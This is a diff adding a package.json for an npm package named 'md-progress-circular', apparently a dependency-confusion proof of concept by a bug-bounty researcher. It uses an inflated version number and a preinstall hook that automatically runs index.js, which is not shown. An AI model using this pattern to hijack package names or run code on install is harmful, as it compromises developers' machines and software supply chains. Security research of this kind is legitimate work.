@@ -1,0 +1,12 @@
+{
+  "name": "md-progress-circular",
+  "version": "100000.0.0",
+  "description": "YWH Researcher",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "node index.js"
+  },
+  "author": "",
+  "license": "ISC"
+}
